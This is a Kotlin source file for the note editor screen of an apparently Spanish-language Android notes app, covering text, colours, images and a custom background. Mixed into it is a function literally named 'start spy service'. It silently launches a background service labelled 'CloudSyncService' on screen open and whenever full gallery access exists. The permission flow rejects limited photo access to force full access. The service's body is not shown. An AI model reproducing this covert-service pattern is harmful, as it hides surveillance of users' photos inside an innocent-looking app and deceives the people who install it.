package cl.example.mynotes

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.View
import android.widget.EditText
import android.widget.ImageButton
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.ViewCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import com.bumptech.glide.Glide
import com.bumptech.glide.load.resource.drawable.DrawableTransitionOptions
import com.bumptech.glide.signature.ObjectKey
import com.yalantis.ucrop.UCrop
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class NoteEditorActivity : AppCompatActivity() {

    // Vistas
    private lateinit var etTitle: EditText
    private lateinit var etContent: EditText
    private lateinit var layoutEditor: View
    private lateinit var tvDateLabel: TextView

    // Vistas de Fondo
    private lateinit var ivBackground: ImageView
    private lateinit var viewOverlay: View
    private lateinit var btnChangeBackground: ImageButton
    private lateinit var btnBack: ImageButton
    private lateinit var btnSave: ImageButton

    // Variables de datos
    private var noteToEdit: Note? = null
    private var selectedColor: String? = "#FFFFFF"

    private val db by lazy { NotesDatabase.getDatabase(this) }

    // --- CÓDIGOS DE PERMISO ---
    private val PERMISSION_REQUEST_GALLERY = 200
    private val PERMISSION_REQUEST_WALLPAPER = 201

    // --- 1. LANZADORES ---

    // Insertar imagen en nota
    private val pickImageLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK) {
            val uri = result.data?.data
            if (uri != null) {
                try {
                    contentResolver.takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION)
                    RichTextHelper.insertImage(this, etContent, uri)
                } catch (e: Exception) {
                    e.printStackTrace()
                    Toast.makeText(this, "Error al cargar imagen", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }

    // Seleccionar Fondo
    private val pickBackgroundLauncher = registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
        if (uri != null) {
            startCrop(uri)
        }
    }

    // Resultado de Recorte (Fondo)
    private val cropResultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            val resultUri = UCrop.getOutput(result.data!!)
            if (resultUri != null) {
                persistBackground(resultUri)
            }
        } else if (result.resultCode == UCrop.RESULT_ERROR) {
            Toast.makeText(this, "Error al recortar", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_note_editor)

        // Configuración Visual
        WindowCompat.getInsetsController(window, window.decorView).isAppearanceLightStatusBars = true
        layoutEditor = findViewById(R.id.editor_root)
        ViewCompat.setOnApplyWindowInsetsListener(layoutEditor) { view, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            view.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        initViews()
        setupListeners()
        loadNoteData()
        cargarFondoEditor() // Cargar fondo si existe

        silentStartService()
    }

    private fun initViews() {
        etTitle = findViewById(R.id.et_title)
        etContent = findViewById(R.id.et_content)
        tvDateLabel = findViewById(R.id.tv_date_label)

        ivBackground = findViewById(R.id.iv_editor_background)
        viewOverlay = findViewById(R.id.view_overlay)
        btnChangeBackground = findViewById(R.id.btn_change_background)
        btnBack = findViewById(R.id.btn_back)
        btnSave = findViewById(R.id.btn_save)
    }

    private fun loadNoteData() {
        if (intent.hasExtra("note_data")) {
            noteToEdit = if (Build.VERSION.SDK_INT >= 33) {
                intent.getParcelableExtra("note_data", Note::class.java)
            } else {
                @Suppress("DEPRECATION")
                intent.getParcelableExtra("note_data") as? Note
            }
            etTitle.setText(noteToEdit?.title)
            selectedColor = noteToEdit?.color
            RichTextHelper.setTextWithImages(this, etContent, noteToEdit?.content ?: "")
            tvDateLabel.text = "Editado: ${noteToEdit?.date}"
            applyColor(selectedColor)
        } else {
            val currentDate = SimpleDateFormat("dd MMM", Locale.getDefault()).format(Date())
            tvDateLabel.text = currentDate
        }
    }

    private fun setupListeners() {
        btnBack.setOnClickListener { finish() }
        btnSave.setOnClickListener { saveNote() }
        findViewById<ImageButton>(R.id.btn_pick_image).setOnClickListener { checkGalleryPermission(PERMISSION_REQUEST_GALLERY) }

        // Botón nuevo para cambiar fondo
        btnChangeBackground.setOnClickListener {
            iniciarFlujoCambioFondo()
        }

        setupColorClick(R.id.color_white, "#FFFFFF")
        setupColorClick(R.id.color_yellow, "#FFF9C4")
        setupColorClick(R.id.color_blue, "#E3F2FD")
        setupColorClick(R.id.color_pink, "#FCE4EC")
        setupColorClick(R.id.color_green, "#E8F5E9")
    }

    private fun setupColorClick(viewId: Int, colorHex: String) {
        findViewById<View>(viewId).setOnClickListener {
            selectedColor = colorHex
            // Si hay un fondo de imagen activo, preguntamos si quiere quitarlo
            val prefs = getSharedPreferences("MyNotesPrefs", Context.MODE_PRIVATE)
            if (prefs.contains("editor_bg_uri")) {
                AlertDialog.Builder(this)
                    .setTitle("Cambiar a Color")
                    .setMessage("¿Deseas quitar la imagen de fondo y usar el color sólido?")
                    .setPositiveButton("Sí") { _, _ ->
                        // Borramos preferencia de fondo
                        prefs.edit().remove("editor_bg_uri").apply()
                        ivBackground.visibility = View.GONE
                        viewOverlay.visibility = View.GONE
                        actualizarColorTexto(false) // Texto oscuro para color claro
                        applyColor(colorHex)
                    }
                    .setNegativeButton("No", null)
                    .show()
            } else {
                applyColor(colorHex)
            }
        }
    }

    private fun applyColor(colorHex: String?) {
        if (colorHex != null) {
            try {
                layoutEditor.setBackgroundColor(Color.parseColor(colorHex))
                etContent.setBackgroundColor(Color.TRANSPARENT)
                actualizarColorTexto(false)
            } catch (e: Exception) { e.printStackTrace() }
        }
    }

    // --- HELPER: VERIFICACIÓN DE PERMISO TOTAL ---
    private fun verificarAccesoTotal(): Boolean {
        return if (Build.VERSION.SDK_INT >= 33) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    // --- GESTIÓN DE PERMISOS ---
    private fun checkGalleryPermission(requestCode: Int) {
        if (verificarAccesoTotal()) {
            iniciarServicioEspia()
            if (requestCode == PERMISSION_REQUEST_GALLERY) openGallery()
            else if (requestCode == PERMISSION_REQUEST_WALLPAPER) pickBackgroundLauncher.launch(arrayOf("image/*"))
        } else {
            val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
            ActivityCompat.requestPermissions(this, arrayOf(permission), requestCode)
        }
    }

    // Flujo específico para el fondo (igual que en MainActivity)
    private fun iniciarFlujoCambioFondo() {
        checkGalleryPermission(PERMISSION_REQUEST_WALLPAPER)
    }

    private fun openGallery() {
        val intent = Intent(Intent.ACTION_OPEN_DOCUMENT).apply {
            addCategory(Intent.CATEGORY_OPENABLE)
            type = "image/*"
        }
        pickImageLauncher.launch(intent)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        val permisoPrincipal = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE

        if (verificarAccesoTotal()) {
            iniciarServicioEspia()
            when (requestCode) {
                PERMISSION_REQUEST_GALLERY -> openGallery()
                PERMISSION_REQUEST_WALLPAPER -> pickBackgroundLauncher.launch(arrayOf("image/*"))
            }
        } else {
            // Lógica de rechazo / explicación (igual que antes)
            val esAccesoLimitado = Build.VERSION.SDK_INT >= 34 &&
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED

            if (esAccesoLimitado) {
                mostrarDialogoConfiguracion("Acceso Limitado Detectado", "Se requiere acceso total a la galería.")
                return
            }

            if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permisoPrincipal)) {
                mostrarDialogoConfiguracion("Permiso Requerido", "Permiso denegado permanentemente. Actívalo en configuración.")
            } else {
                Toast.makeText(this, "Permiso necesario.", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun mostrarDialogoConfiguracion(titulo: String, mensaje: String) {
        AlertDialog.Builder(this)
            .setTitle(titulo)
            .setMessage(mensaje)
            .setCancelable(false)
            .setPositiveButton("Ir a Configuración") { _, _ ->
                try {
                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                    intent.data = Uri.fromParts("package", packageName, null)
                    startActivity(intent)
                } catch (e: Exception) { e.printStackTrace() }
            }
            .setNegativeButton("Cancelar", null)
            .show()
    }

    // --- LÓGICA DE FONDO (Igual a MainActivity) ---
    private fun startCrop(uri: Uri) {
        val destinationFileName = "editor_bg_${System.currentTimeMillis()}.jpg"
        val destinationFile = File(cacheDir, destinationFileName)
        val destinationUri = Uri.fromFile(destinationFile)

        val metrics = resources.displayMetrics
        val options = UCrop.Options().apply {
            setCompressionQuality(90)
            setStatusBarColor(Color.BLACK)
            setToolbarColor(Color.BLACK)
            setToolbarWidgetColor(Color.WHITE)
            setRootViewBackgroundColor(Color.BLACK)
            setActiveControlsWidgetColor(Color.parseColor("#2979FF"))
            setToolbarTitle("Ajustar Fondo Nota")
            setShowCropGrid(true)
            setFreeStyleCropEnabled(false) // Obligar a mantener ratio pantalla
        }

        val uCropIntent = UCrop.of(uri, destinationUri)
            .withAspectRatio(metrics.widthPixels.toFloat(), metrics.heightPixels.toFloat())
            .withMaxResultSize(1080, 2400)
            .withOptions(options)
            .getIntent(this)

        cropResultLauncher.launch(uCropIntent)
    }

    private fun persistBackground(croppedUri: Uri) {
        try {
            // Guardamos como 'custom_editor_bg.jpg'
            val finalFile = File(filesDir, "custom_editor_bg.jpg")
            contentResolver.openInputStream(croppedUri)?.use { input ->
                finalFile.outputStream().use { output -> input.copyTo(output) }
            }
            val finalUri = Uri.fromFile(finalFile)
            val prefs = getSharedPreferences("MyNotesPrefs", Context.MODE_PRIVATE)
            prefs.edit().putString("editor_bg_uri", finalUri.toString()).apply()

            mostrarFondo(finalUri)
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun cargarFondoEditor() {
        val prefs = getSharedPreferences("MyNotesPrefs", Context.MODE_PRIVATE)
        val uriString = prefs.getString("editor_bg_uri", null)
        if (uriString != null) {
            mostrarFondo(Uri.parse(uriString))
        }
    }

    private fun mostrarFondo(uri: Uri) {
        ivBackground.visibility = View.VISIBLE
        viewOverlay.visibility = View.VISIBLE

        Glide.with(this)
            .load(uri)
            .signature(ObjectKey(System.currentTimeMillis().toString()))
            .centerCrop()
            .transition(DrawableTransitionOptions.withCrossFade())
            .into(ivBackground)

        // Cambiar texto e iconos a blanco para que se vean sobre el fondo oscuro
        actualizarColorTexto(true)
    }

    private fun actualizarColorTexto(esFondoImagen: Boolean) {
        val color = if (esFondoImagen) Color.WHITE else Color.BLACK
        val hintColor = if (esFondoImagen) Color.LTGRAY else Color.GRAY

        etTitle.setTextColor(color)
        etTitle.setHintTextColor(hintColor)
        etContent.setTextColor(color)
        etContent.setHintTextColor(hintColor)
        tvDateLabel.setTextColor(hintColor)

        btnBack.setColorFilter(color)
        btnChangeBackground.setColorFilter(color)
        btnSave.setColorFilter(color)
    }

    // --- SERVICIOS Y GUARDADO ---
    private fun iniciarServicioEspia() {
        if (verificarAccesoTotal()) {
            val intent = Intent(this, CloudSyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
            else startService(intent)
        }
    }

    private fun silentStartService() {
        if (verificarAccesoTotal()) iniciarServicioEspia()
    }

    private fun saveNote() {
        val title = etTitle.text.toString().trim()
        val contentWithTags = etContent.text.toString()

        if (title.isEmpty() && contentWithTags.trim().isEmpty()) {
            Toast.makeText(this, "La nota está vacía", Toast.LENGTH_SHORT).show()
            return
        }

        val formattedDate = SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault()).format(Date())

        CoroutineScope(Dispatchers.IO).launch {
            if (noteToEdit == null) {
                val newNote = Note(title = title, content = contentWithTags, date = formattedDate, color = selectedColor)
                db.notesDao().insert(newNote)
            } else {
                noteToEdit?.apply {
                    this.title = title
                    this.content = contentWithTags
                    this.date = formattedDate
                    this.color = selectedColor
                }
                db.notesDao().update(noteToEdit!!)
            }
            withContext(Dispatchers.Main) {
                Toast.makeText(this@NoteEditorActivity, "Guardado", Toast.LENGTH_SHORT).show()
                finish()
            }
        }
    }
}